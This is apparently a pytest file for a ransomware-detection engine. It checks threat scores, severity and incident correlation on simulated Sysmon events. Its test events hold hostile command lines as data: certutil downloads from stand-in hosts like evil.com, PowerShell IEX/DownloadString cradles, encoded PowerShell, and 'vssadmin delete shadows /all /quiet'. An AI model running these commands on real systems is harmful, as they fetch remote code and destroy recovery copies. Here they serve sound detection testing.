from datetime import datetime, timezone
from ransomeye.threat_assessment import assess_threat
from ransomeye.storage import EvidenceStore
from ransomeye.investigation import load_investigation


def make_file_events(count=50):
    return [
        {
            "event_id": f"file-{index}",
            "timestamp": f"2026-08-08T15:00:00.{index:03d}Z",
            "source": "simulation",
            "event_type": "file_modify",
            "process_name": "test_process.exe",
            "file_path": f"C:\\Lab\\file{index}.encrypted",
        }
        for index in range(count)
    ]


def _severity_rank(severity: str) -> int:
    return {"SAFE": 0, "LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}.get(severity, -1)


def test_no_suspicious_events_are_safe():
    events = [
        {
            "event_id": "event-1",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "notepad.exe",
            "command_line": "notepad.exe",
            "pid": "1000",
        }
    ]

    result = assess_threat(events)

    assert result["score"] == 0
    assert result["severity"] == "SAFE"
    assert result["finding_count"] == 0


def test_single_encoded_powershell_is_not_safe():
    events = [
        {
            "event_id": "powershell-1",
            "timestamp": "2026-08-08T15:00:02Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -EncodedCommand SGVsbG8=",
            "pid": "4532",
        }
    ]

    result = assess_threat(events)

    assert result["score"] > 0
    assert result["severity"] != "SAFE"


def test_single_certutil_download_is_not_safe():
    events = [
        {
            "event_id": "certutil-1",
            "timestamp": "2026-08-08T15:00:03Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "certutil.exe",
            "command_line": "certutil.exe -urlcache -split -f http://example.com/file.exe output.bin",
            "pid": "4533",
        }
    ]

    result = assess_threat(events)

    assert result["score"] > 0
    assert result["severity"] != "SAFE"


def test_multiple_suspicious_findings_raise_score_and_severity():
    powershell_event = {
        "event_id": "powershell-1",
        "timestamp": "2026-08-08T15:00:02Z",
        "source": "sysmon",
        "event_type": "process_creation",
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -EncodedCommand SGVsbG8=",
        "pid": "4532",
    }
    certutil_event = {
        "event_id": "certutil-1",
        "timestamp": "2026-08-08T15:00:03Z",
        "source": "sysmon",
        "event_type": "process_creation",
        "process_name": "certutil.exe",
        "command_line": "certutil.exe -urlcache -split -f http://example.com/file.exe output.bin",
        "pid": "4533",
    }

    single_powershell_result = assess_threat([powershell_event])
    single_certutil_result = assess_threat([certutil_event])
    combined_result = assess_threat([powershell_event, certutil_event])

    assert combined_result["score"] > single_powershell_result["score"]
    assert combined_result["score"] > single_certutil_result["score"]
    assert _severity_rank(combined_result["severity"]) >= _severity_rank(single_powershell_result["severity"])


def test_benign_powershell_get_date_is_safe():
    events = [
        {
            "event_id": "event-1",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe Get-Date",
            "pid": "1000",
        }
    ]

    result = assess_threat(events)

    assert result["score"] == 0
    assert result["severity"] == "SAFE"
    assert result["finding_count"] == 0


def test_benign_certutil_certificate_inspection_is_safe():
    events = [
        {
            "event_id": "event-2",
            "timestamp": "2026-08-08T15:00:01Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "certutil.exe",
            "command_line": "certutil.exe -store -user My",
            "pid": "1001",
        }
    ]

    result = assess_threat(events)

    assert result["score"] == 0
    assert result["severity"] == "SAFE"
    assert result["finding_count"] == 0


def test_high_confidence_findings_report_higher_confidence(monkeypatch):
    events = [
        {
            "event_id": "event-3",
            "timestamp": "2026-08-08T15:00:04Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -EncodedCommand SGVsbG8=",
            "pid": "4540",
        }
    ]

    high_confidence_finding = [
        {
            "type": "suspicious_powershell",
            "score": 10,
            "confidence": 0.95,
            "technique": "T1059.001",
            "process_name": "powershell.exe",
            "pid": "4540",
            "event_id": "event-3",
            "reason": "Suspicious PowerShell indicators detected",
        }
    ]
    low_confidence_finding = [
        {
            "type": "suspicious_powershell",
            "score": 10,
            "confidence": 0.40,
            "technique": "T1059.001",
            "process_name": "powershell.exe",
            "pid": "4540",
            "event_id": "event-3",
            "reason": "Suspicious PowerShell indicators detected",
        }
    ]

    monkeypatch.setattr(
        "ransomeye.threat_assessment.analyze_behavior",
        lambda events: high_confidence_finding,
    )
    high_confidence_result = assess_threat(events)

    monkeypatch.setattr(
        "ransomeye.threat_assessment.analyze_behavior",
        lambda events: low_confidence_finding,
    )
    low_confidence_result = assess_threat(events)

    assert high_confidence_result["confidence"] > low_confidence_result["confidence"]


def test_correlated_activity_produces_combined_score():
    events = make_file_events()

    events.extend(
        [
            {
                "event_id": "note-1",
                "timestamp": "2026-08-08T15:00:01Z",
                "source": "simulation",
                "event_type": "file_create",
                "process_name": "test_process.exe",
                "file_path": "C:\\Lab\\README_DECRYPT.txt",
            },
            {
                "event_id": "powershell-1",
                "timestamp": "2026-08-08T15:00:02Z",
                "source": "sysmon",
                "event_type": "process_creation",
                "process_name": "powershell.exe",
                "command_line": (
                    "powershell.exe -EncodedCommand SGVsbG8="
                ),
                "pid": "4532",
            },
            {
                "event_id": "recovery-1",
                "timestamp": "2026-08-08T15:00:03Z",
                "source": "sysmon",
                "event_type": "process_creation",
                "process_name": "vssadmin.exe",
                "command_line": (
                    "vssadmin delete shadows /all /quiet"
                ),
                "pid": "4533",
            },
        ]
    )

    result = assess_threat(events)

    assert result["score"] == 65

    assert result["severity"] == "MEDIUM"
    assert result["finding_count"] == 4
    assert "T1059.001" in result["techniques"]
    assert "T1490" in result["techniques"]
    assert result["confidence"] > 0
    assert result["correlation_count"] > 0
    assert len(result["correlations"]) > 0


def test_no_events_produces_zero_correlations():
    result = assess_threat([])

    assert result["correlation_count"] == 0
    assert result["correlations"] == []


def test_real_assessment_invokes_correlate_events_and_populates_results():
    events = [
        {
            "event_id": "evt-proc-1",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -EncodedCommand SGVsbG8=",
            "pid": "1000",
            "process_guid": "{GUID-CMD-1000}",
        },
        {
            "event_id": "evt-proc-2",
            "timestamp": "2026-08-08T15:00:05Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe downloadstring(http://test.com)",
            "pid": "1000",
            "process_guid": "{GUID-CMD-1000}",
        },
    ]

    result = assess_threat(events)

    assert result["correlation_count"] == 1
    assert len(result["correlations"]) == 1

    corr = result["correlations"][0]
    assert corr["incident_id"].startswith("INC-")
    assert corr["process_key"] == "guid:{GUID-CMD-1000}"
    assert corr["start_time"] in ("2026-08-08T15:00:00Z", "2026-08-08T15:00:00+00:00")
    assert corr["end_time"] in ("2026-08-08T15:00:05Z", "2026-08-08T15:00:05+00:00")
    assert corr["duration"] == 5.0
    assert corr["evidence_event_ids"] == ["evt-proc-1", "evt-proc-2"]


def test_multiple_correlated_incidents_represented_correctly():
    events = [
        {
            "event_id": "evt-proc-a",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -EncodedCommand SGVsbG8=",
            "pid": "1000",
            "process_guid": "{GUID-A}",
        },
        {
            "event_id": "evt-proc-b",
            "timestamp": "2026-08-08T15:00:01Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "certutil.exe",
            "command_line": "certutil.exe -urlcache -split -f http://test.com out.bin",
            "pid": "2000",
            "process_guid": "{GUID-B}",
        },
    ]

    result = assess_threat(events)

    assert result["correlation_count"] == 2
    assert len(result["correlations"]) == 2
    assert result["correlations"][0]["evidence_event_ids"] == ["evt-proc-a"]
    assert result["correlations"][1]["evidence_event_ids"] == ["evt-proc-b"]


# -------------------------------------------------------------------------
# Milestone 19 Step 3: Threat Assessment Integration Tests
# -------------------------------------------------------------------------

def test_integration_1_no_findings_zero_correlations():
    """Benign events produce 0 findings and 0 correlations."""
    events = [
        {
            "event_id": "b-1",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "calc.exe",
            "command_line": "calc.exe",
            "pid": "1000",
        }
    ]
    result = assess_threat(events)
    assert result["finding_count"] == 0
    assert result["correlation_count"] == 0
    assert result["correlations"] == []


def test_integration_2_one_isolated_finding_no_false_correlation():
    """Single isolated finding creates 1 incident and does not falsely correlate."""
    events = [
        {
            "event_id": "ps-1",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -enc AAAA",
            "pid": "1000",
            "process_guid": "{GUID-PS}",
        },
        {
            "event_id": "benign-1",
            "timestamp": "2026-08-08T15:00:05Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "notepad.exe",
            "command_line": "notepad.exe",
            "pid": "2000",
            "process_guid": "{GUID-NOTEPAD}",
        },
    ]
    result = assess_threat(events)
    assert result["finding_count"] == 1
    assert result["correlation_count"] == 1
    assert result["correlations"][0]["finding_ids"] != []
    assert result["correlations"][0]["evidence_ids"] == ["ps-1"]


def test_integration_3_multiple_findings_same_process_guid():
    """Multiple findings under same ProcessGuid correlate into 1 incident."""
    events = [
        {
            "event_id": "ps-1",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -enc AAAA",
            "pid": "1000",
            "process_guid": "{GUID-MAL}",
        },
        {
            "event_id": "ps-2",
            "timestamp": "2026-08-08T15:00:02Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe downloadstring(http://mal.com)",
            "pid": "1000",
            "process_guid": "{GUID-MAL}",
        },
    ]
    result = assess_threat(events)
    assert result["finding_count"] == 2
    assert result["correlation_count"] == 1
    corr = result["correlations"][0]
    assert len(corr["finding_ids"]) == 2
    assert "same_process_guid" in corr["correlation_reasons"]


def test_integration_4_parent_child_findings_within_window():
    """Parent and child processes with findings correlate within 60s."""
    events = [
        {
            "event_id": "p-1",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -enc AAAA",
            "pid": "1000",
            "process_guid": "{GUID-PARENT}",
        },
        {
            "event_id": "c-1",
            "timestamp": "2026-08-08T15:00:10Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "certutil.exe",
            "command_line": "certutil.exe -urlcache -split -f http://evil.com/x.exe out.exe",
            "pid": "2000",
            "process_guid": "{GUID-CHILD}",
            "parent_pid": "1000",
            "parent_process_guid": "{GUID-PARENT}",
        },
    ]
    result = assess_threat(events)
    assert result["finding_count"] == 2
    assert result["correlation_count"] == 1
    corr = result["correlations"][0]
    assert len(corr["finding_ids"]) == 2
    assert "parent_child_within_window" in corr["correlation_reasons"]


def test_integration_5_pid_fallback_within_and_beyond_window():
    """PID fallback correlates within 60s and separates beyond 60s."""
    # Within 60s
    events_within = [
        {
            "event_id": "ps-1",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -enc AAAA",
            "pid": "1000",
        },
        {
            "event_id": "ps-2",
            "timestamp": "2026-08-08T15:00:20Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe IEX (New-Object Net.WebClient).DownloadString()",
            "pid": "1000",
        },
    ]
    res_within = assess_threat(events_within)
    assert res_within["finding_count"] == 2
    assert res_within["correlation_count"] == 1
    assert "pid_fallback_within_window" in res_within["correlations"][0]["correlation_reasons"]

    # Beyond 60s
    events_beyond = [
        {
            "event_id": "ps-1",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -enc AAAA",
            "pid": "1000",
        },
        {
            "event_id": "ps-2",
            "timestamp": "2026-08-08T15:01:20Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe IEX (New-Object Net.WebClient).DownloadString()",
            "pid": "1000",
        },
    ]
    res_beyond = assess_threat(events_beyond)
    assert res_beyond["finding_count"] == 2
    assert res_beyond["correlation_count"] == 2


def test_integration_6_unrelated_findings_remain_separate():
    """Unrelated processes with findings produce separate incidents."""
    events = [
        {
            "event_id": "ps-1",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -enc AAAA",
            "pid": "1000",
            "process_guid": "{GUID-1}",
        },
        {
            "event_id": "cu-1",
            "timestamp": "2026-08-08T15:00:05Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "certutil.exe",
            "command_line": "certutil.exe -urlcache -split -f http://evil.com/x.exe out.exe",
            "pid": "2000",
            "process_guid": "{GUID-2}",
        },
    ]
    result = assess_threat(events)
    assert result["finding_count"] == 2
    assert result["correlation_count"] == 2


def test_integration_7_deterministic_incident_ids():
    """Repeated assessments with identical semantic inputs produce identical incident IDs."""
    events = [
        {
            "event_id": "ps-1",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -enc AAAA",
            "pid": "1000",
            "process_guid": "{GUID-1}",
        },
        {
            "event_id": "ps-2",
            "timestamp": "2026-08-08T15:00:05Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe downloadstring(http://x.com)",
            "pid": "1000",
            "process_guid": "{GUID-1}",
        },
    ]
    res1 = assess_threat(events)
    res2 = assess_threat(list(reversed(events)))
    assert res1["correlations"][0]["incident_id"] == res2["correlations"][0]["incident_id"]
    assert res1["correlations"][0]["incident_id"].startswith("INC-")


def test_integration_8_score_preservation_no_double_counting():
    """Correlation grouping does not artificially inflate or double-count scores."""
    powershell_event = {
        "event_id": "ps-1",
        "timestamp": "2026-08-08T15:00:00Z",
        "source": "sysmon",
        "event_type": "process_creation",
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -EncodedCommand SGVsbG8=",
        "pid": "4532",
        "process_guid": "{GUID-SAME}",
    }
    certutil_event = {
        "event_id": "cu-1",
        "timestamp": "2026-08-08T15:00:05Z",
        "source": "sysmon",
        "event_type": "process_creation",
        "process_name": "certutil.exe",
        "command_line": "certutil.exe -urlcache -split -f http://example.com/file.exe output.bin",
        "pid": "4532",
        "process_guid": "{GUID-SAME}",
    }

    result = assess_threat([powershell_event, certutil_event])
    # 2 behavior findings: 10 + 12 = 22, behavior floor = 50, total = 50
    assert result["score"] == 50
    assert result["severity"] == "MEDIUM"
    assert result["correlation_count"] == 1


def test_integration_9_assessment_persistence_round_trip(tmp_path):
    """Assessment containing correlations persists to SQLite and loads cleanly."""
    database_path = tmp_path / "assess_persist.db"
    store = EvidenceStore(database_path)
    store.create_case("CASE-INTEG", "Integration Test")

    events = [
        {
            "event_id": "ps-1",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -enc AAAA",
            "pid": "1000",
            "process_guid": "{GUID-P}",
        },
        {
            "event_id": "ps-2",
            "timestamp": "2026-08-08T15:00:10Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe downloadstring(http://x.com)",
            "pid": "1000",
            "process_guid": "{GUID-P}",
        },
    ]
    for ev in events:
        store.save_event("CASE-INTEG", ev)

    assessment = assess_threat(events)
    store.save_assessment("CASE-INTEG", assessment)
    store.close()

    inv = load_investigation(database_path, "CASE-INTEG")
    assert inv.assessment["score"] == assessment["score"]
    assert inv.assessment["severity"] == assessment["severity"]
    assert len(inv.correlations) == 1
    assert inv.correlations[0]["incident_id"] == assessment["correlations"][0]["incident_id"]
    assert inv.correlations[0]["finding_ids"] == assessment["correlations"][0]["finding_ids"]
    assert inv.correlations[0]["evidence_ids"] == ["ps-1", "ps-2"]
